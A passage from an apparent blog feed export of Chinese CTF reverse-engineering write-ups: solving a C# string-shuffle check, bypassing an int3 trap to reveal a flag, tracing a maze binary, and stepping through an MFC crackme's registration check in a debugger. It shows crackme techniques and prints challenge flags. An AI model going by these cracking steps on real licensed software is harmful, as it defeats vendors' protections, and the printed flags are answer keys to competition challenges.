class="number">20</span>);  <span class="comment">// 去掉中间插入的部分</span></span><br><span class="line"><span class="keyword">string</span> text2 = text.Substring(text.Length - <span class="number">10</span>, <span class="number">10</span>) + text.Substring(text.Length - <span class="number">20</span>, <span class="number">10</span>) + text.Substring(<span class="number">0</span>, text.Length - <span class="number">20</span>);<span class="comment">// 恢复顺序</span></span><br><span class="line"><span class="keyword">string</span> <span class="keyword">value</span>;</span><br><span class="line">    <span class="comment">// 恢复最初的取余扩充操作，因为不知道原flag多少位，所以这里需要计算保留的位数</span></span><br><span class="line"><span class="keyword">if</span> (text2.Length == <span class="number">63</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">value</span> = text2.Substring(<span class="number">21</span>, <span class="number">21</span>);<span class="comment">//根据计算得到的位数，去掉扩充的部分即为flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (text2.Length == <span class="number">44</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">value</span> = text2.Substring(<span class="number">11</span>, <span class="number">22</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (text2.Length == <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">value</span> = text2.Substring(<span class="number">7</span>, <span class="number">23</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">value</span> = text2.Substring(<span class="number">6</span>, <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="keyword">value</span>);<span class="comment">// 打印解密出来的flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译，运行，得到结果。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555326487155.png" alt="1555326487155.png"></p><p>所以最终的flag为：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flag&#123;8340e53bdb4915e6c808aa3d&#125;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a class="header-anchor" href="#总结"></a>总结</h2><p>这道题没什么技巧，实际上就是代码审计。虽然留了几个坑，但是出题人也比较良心，没有设陷阱。最主要的是比较字符串的时候要留神，题目中做了多次截断和拼接，所以不能粗心，建议在分析的时候，可以一边解一边调试。</p>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Messy_code-writeup</title>
      <link href="/p/415a8c87.html"/>
      <url>/p/415a8c87.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>首先打开题目，发现flag乱码，用PEiD查看文件信息，发现是32位控制台程序。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup12.png" alt="writeup12.PNG"></p><a id="more"></a><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup13.png" alt="writeup13.PNG"></p></li><li><p>用32位的IDA打开程序，无法直接找到main函数。通过程序可知控制台程序调用了一个窗口显示flag，窗口的名字为This is flag，所以在IDA中查找该字符串，可以找到main函数的位置。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup14.png" alt="writeup14.PNG"></p></li><li><p>接着用OD分析程序，通过字符串搜索找到main函数的位置，在第一个call指令下断点，然后运行程序。s</p></li><li><p>在IDA中发现其中一个分支对字符串进行了处理。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup15.png" alt="writeup15.PNG"></p></li><li><p>单步跟进，使程序跳转到这个条件分支，第一条指令int3是中断指令，所以修改EIP的值跳过这个指令。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup16.png" alt="writeup16.PNG"></p></li><li><p>然后跟进到一个函数中，在IDA中发现该函数对字符串进行了处理，初步判断这是个解码函数。</p></li><li><p>函数返回后跳过exit，经过MessageBoxA函数，显示出来的就是正确的flag。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup17.png" alt="writeup17.PNG"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都理工大学华为杯CTF决赛之两道逆向writeup</title>
      <link href="/p/c3b1eed1.html"/>
      <url>/p/c3b1eed1.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-simple-Maze"><a class="header-anchor" href="#0x00-simple-Maze"></a>0x00 simple_Maze</h2><p>题目如下：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555904702802.png" alt="1555904702802.png"></p><p>那么为迷宫题了，下载文件为二进制，非exe。</p><a id="more"></a><p>按照惯例查一下：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555904816729.png" alt="1555904816729.png"></p><p>可见是gcc编译的linux程序。</p><p>跑一下：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555904918018.png" alt="1555904918018.png"></p><p>然后用IDA反编译：</p><p>main函数代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+10h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// [rsp+18h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// [rsp+20h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// [rsp+30h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// [rsp+38h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v11; <span class="comment">// [rsp+40h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v12; <span class="comment">// [rsp+48h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+50h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+BCh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="string">"  ------"</span>;<span class="comment">// 这里就是迷宫地图了</span></span><br><span class="line">  v6 = <span class="string">"-     --"</span>;</span><br><span class="line">  v7 = <span class="string">"- --- --"</span>;</span><br><span class="line">  v8 = <span class="string">"-   ----"</span>;</span><br><span class="line">  v9 = <span class="string">"---   --"</span>;</span><br><span class="line">  v10 = <span class="string">"-   ----"</span>;</span><br><span class="line">  v11 = <span class="string">"- --    "</span>;</span><br><span class="line">  v12 = <span class="string">"-    --*"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input:"</span>, argv, envp, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, s);</span><br><span class="line">  check_input(s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &gt; <span class="number">0x14</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The input is so long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="string">'W'</span> )<span class="comment">// 逻辑很简单</span></span><br><span class="line">      --row_3061;        <span class="comment">// WASD控制方向，不能碰到'-'</span></span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="string">'S'</span> )<span class="comment">// 行走到'*'处即到达终点</span></span><br><span class="line">      ++row_3061;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="string">'A'</span> )</span><br><span class="line">      --column_3062;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="string">'D'</span> )</span><br><span class="line">      ++column_3062;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v5)[row_3061][column_3062] == <span class="string">'-'</span> || row_3061 &lt; <span class="number">0</span> || column_3062 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"It is a wrong way!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;v5)[row_3061][column_3062] == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! reach the final!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The flag is flag&#123;#your input#&#125;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制出地图，简单分析可知迷宫路径如下：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555905879868.png" alt="1555905879868.png"></p><p>路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DSSSDDSSAASSDDDWDDDS</span><br></pre></td></tr></table></figure><p>填入验证，正确。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555906040811.png" alt="1555906040811.png"></p><p>所以flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DSSSDDSSAASSDDDWDDDS&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-MFC-reverse"><a class="header-anchor" href="#0x01-MFC-reverse"></a>0x01 MFC_reverse</h2><p>这道题相对于上一道稍难，但是也没有什么套路。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555906245535.png" alt="1555906245535.png"></p><p>看起来是一道mfc的题，让求出指定用户名的注册码。</p><p>惯例PEID：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555906329907.png" alt="1555906329907.png"></p><p>无壳，那么运行看看。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555906441045.png" alt="1555906441045.png"></p><p>随便输入注册码后提示错误（废话）。</p><p>这种题直接OD动态：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555907503835.png" alt="1555907503835.png"></p><p>这里需要用到一点点小技巧，mfc程序的窗口一般调用的是messagebox这个系统API，所以我们这里切入点在输入错误后的弹窗。需要用API断点：</p><p>命令行输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BP MessageBoxW</span><br></pre></td></tr></table></figure><p>发现多了一个断点：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555907746217.png" alt="1555907746217.png"></p><p>现在随便输入注册码，点确认，发现程序停下来了：<br><img src="http://sz.guiu.xyz/images/2020/02/25/1555907875218.png" alt="1555907875218.png"></p><p>然后F8单步，使其返回到用户代码。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555907939511.png" alt="1555907939511.png"></p><p>回到了task_MyC领空下。</p><p>我们需要分析的是错误弹窗之前程序做的操作，所以禁用API断点，回溯主程序之前的代码，在主程序入口处下断：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555908198263.png" alt="1555908198263.png"></p><p>F9使程序继续运行，然后点击确定，程序停在了主程序入口处。</p><p>接下来使用F8单步，看看我们点击”确定“后，程序做了哪些操作：</p><p>发现可疑点：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1555911914733.png" alt="1555911914733.png"></p><p>出现了符合预期的字符串，说明下面的操作很可能跟注册码有关了。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>9F1BB3    <span class="number">8</span>D8D <span class="number">40</span>FFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xC0</span>]</span><br><span class="line"><span class="number">00</span>9F1BB9    FF15 C0F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#6123&gt;]    ; mfc140ud.#6123</span></span><br><span class="line"><span class="number">00</span>9F1BBF    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1BC1    E8 <span class="number">85</span>FEFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1BC6    <span class="number">50</span>              push eax                                 ; 这一段是对cdut ctf reverse 字符串做操作</span><br><span class="line"><span class="number">00</span>9F1BC7    <span class="number">8</span>D8D <span class="number">24</span>FCFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x3DC</span>]</span><br><span class="line"><span class="number">00</span>9F1BCD    E8 <span class="number">3100</span>FFFF     call task_MyC.<span class="number">00</span>9E1C03</span><br><span class="line"><span class="number">00</span>9F1BD2    <span class="number">8985</span> ECFBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x414</span>],eax</span><br><span class="line"><span class="number">00</span>9F1BD8    <span class="number">8</span>B85 ECFBFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x414</span>]</span><br><span class="line"><span class="number">00</span>9F1BDE    <span class="number">8985</span> E8FBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x418</span>],eax</span><br><span class="line"><span class="number">00</span>9F1BE4    C645 FC 09      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0x9</span></span><br><span class="line"><span class="number">00</span>9F1BE8    <span class="number">8</span>B8D E8FBFFFF   mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x418</span>]</span><br><span class="line"><span class="number">00</span>9F1BEE    E8 <span class="number">9903</span>FFFF     call task_MyC.<span class="number">00</span>9E1F8C</span><br><span class="line"><span class="number">00</span>9F1BF3    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1BF4    <span class="number">8</span>D8D <span class="number">90</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x170</span>]</span><br><span class="line"><span class="number">00</span>9F1BFA    E8 E6F5FEFF     call task_MyC.<span class="number">00</span>9E11E5</span><br><span class="line"><span class="number">00</span>9F1BFF    C645 FC 08      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0x8</span></span><br><span class="line"><span class="number">00</span>9F1C03    <span class="number">8</span>D8D <span class="number">24</span>FCFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x3DC</span>]</span><br><span class="line"><span class="number">00</span>9F1C09    E8 C403FFFF     call task_MyC.<span class="number">00</span>9E1FD2</span><br><span class="line"><span class="number">00</span>9F1C0E    <span class="number">8</span>D85 <span class="number">90</span>FEFFFF   lea eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x170</span>]</span><br><span class="line"><span class="number">00</span>9F1C14    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1C15    <span class="number">8</span>D8D B4FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x14C</span>]</span><br><span class="line"><span class="number">00</span>9F1C1B    E8 <span class="number">25</span>FFFEFF     call task_MyC.<span class="number">00</span>9E1B45</span><br><span class="line"><span class="number">00</span>9F1C2<span class="number">0</span>    <span class="number">8</span>D85 <span class="number">00</span>FCFFFF   lea eax,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x400</span>]</span><br><span class="line"><span class="number">00</span>9F1C26    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1C27    <span class="number">8</span>D8D B4FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x14C</span>]</span><br><span class="line"><span class="number">00</span>9F1C2D    E8 <span class="number">5</span>DFBFEFF     call task_MyC.<span class="number">00</span>9E178F</span><br><span class="line"><span class="number">00</span>9F1C32    <span class="number">8985</span> ECFBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x414</span>],eax</span><br><span class="line"><span class="number">00</span>9F1C38    <span class="number">8</span>B8D ECFBFFFF   mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x414</span>]</span><br><span class="line"><span class="number">00</span>9F1C3E    <span class="number">898</span>D E8FBFFFF   mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x418</span>],ecx</span><br><span class="line"><span class="number">00</span>9F1C44    C645 FC 0A      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0xA</span></span><br><span class="line"><span class="number">00</span>9F1C48    <span class="number">8</span>B8D E8FBFFFF   mov ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x418</span>]</span><br><span class="line"><span class="number">00</span>9F1C4E    E8 <span class="number">4</span>FF7FEFF     call task_MyC.<span class="number">00</span>9E13A2                   ; 推测是对“cdut ctf reverse.”做md5操作</span><br><span class="line"><span class="number">00</span>9F1C53    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1C55    <span class="number">50</span>              push eax</span><br><span class="line"><span class="number">00</span>9F1C56    <span class="number">8</span>D8D <span class="number">4</span>CFFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xB4</span>]</span><br><span class="line"><span class="number">00</span>9F1C5C    FF15 D8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1674&gt;]    ; mfc140ud.#1674</span></span><br><span class="line"><span class="number">00</span>9F1C62    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1C64    E8 E2FDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1C69    C645 FC 08      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0x8</span></span><br><span class="line"><span class="number">00</span>9F1C6D    <span class="number">8</span>D8D <span class="number">00</span>FCFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x400</span>]</span><br><span class="line"><span class="number">00</span>9F1C73    E8 B1FCFEFF     call task_MyC.<span class="number">00</span>9E1929</span><br><span class="line"><span class="number">00</span>9F1C78    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1C7A    <span class="number">68</span> <span class="number">2631</span>A00<span class="number">0</span>     push task_MyC.<span class="number">00</span>A03126</span><br><span class="line"><span class="number">00</span>9F1C7F    <span class="number">8</span>D8D <span class="number">34</span>FFFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0xCC</span>]</span><br><span class="line"><span class="number">00</span>9F1C85    FF15 D8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1674&gt;]    ; mfc140ud.#1674</span></span><br><span class="line"><span class="number">00</span>9F1C8B    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1C8D    E8 B9FDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1C92    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1C94    <span class="number">8</span>D8D <span class="number">78</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x188</span>]</span><br><span class="line"><span class="number">00</span>9F1C9A    FF15 C8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#302&gt;]     ; mfc140ud.#302</span></span><br><span class="line"><span class="number">00</span>9F1CA<span class="number">0</span>    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1CA2    E8 A4FDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1CA7    C645 FC 0B      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0xB</span></span><br><span class="line"><span class="number">00</span>9F1CAB    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1CAD    <span class="number">8</span>D8D <span class="number">6</span>CFEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x194</span>]</span><br><span class="line"><span class="number">00</span>9F1CB3    FF15 C8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#302&gt;]     ; mfc140ud.#302</span></span><br><span class="line"><span class="number">00</span>9F1CB9    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1CBB    E8 <span class="number">8</span>BFDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1CC<span class="number">0</span>    C645 FC 0C      mov byte ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x4</span>],<span class="number">0xC</span></span><br><span class="line"><span class="number">00</span>9F1CC4    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1CC6    <span class="number">68</span> F440A00<span class="number">0</span>     push task_MyC.<span class="number">00</span>A040F4                   ; 错误。</span><br><span class="line"><span class="number">00</span>9F1CCB    <span class="number">8</span>D8D <span class="number">78</span>FEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x188</span>]</span><br><span class="line"><span class="number">00</span>9F1CD1    FF15 D8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1674&gt;]    ; mfc140ud.#1674</span></span><br><span class="line"><span class="number">00</span>9F1CD7    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1CD9    E8 <span class="number">6</span>DFDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1CDE    <span class="number">8</span>BF4            mov esi,esp</span><br><span class="line"><span class="number">00</span>9F1CE<span class="number">0</span>    <span class="number">68</span> <span class="number">9430</span>A00<span class="number">0</span>     push task_MyC.<span class="number">00</span>A03094                   ; 正确,flag形式为：CDUTCTF&#123;注册码&#125;</span><br><span class="line"><span class="number">00</span>9F1CE5    <span class="number">8</span>D8D <span class="number">6</span>CFEFFFF   lea ecx,dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x194</span>]</span><br><span class="line"><span class="number">00</span>9F1CEB    FF15 D8F2A00<span class="number">0</span>   call dword ptr <span class="symbol">ds:</span>[&lt;&amp;mfc140ud.<span class="comment">#1674&gt;]    ; mfc140ud.#1674</span></span><br><span class="line"><span class="number">00</span>9F1CF1    <span class="number">3</span>BF4            cmp esi,esp</span><br><span class="line"><span class="number">00</span>9F1CF3    E8 <span class="number">53</span>FDFEFF     call task_MyC.<span class="number">00</span>9E1A4B</span><br><span class="line"><span class="number">00</span>9F1CF8    C785 <span class="number">60</span>FEFFFF <span class="number">0</span>&gt;mov dword ptr <span class="symbol">ss:</span>[ebp-<span class="number">0x1A0</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">00</span>9F1D02    EB 0F           jmp short task_MyC.<span class="number">00</span>9F1D13</span><br><span class="line"><span class="number">00</span>9F1D04    <span class="number">8</span>B85 <span class="number">60</span>FEFFFF   mov eax,dword ptr <span class="symbol">ss:</span>[ebp-<span 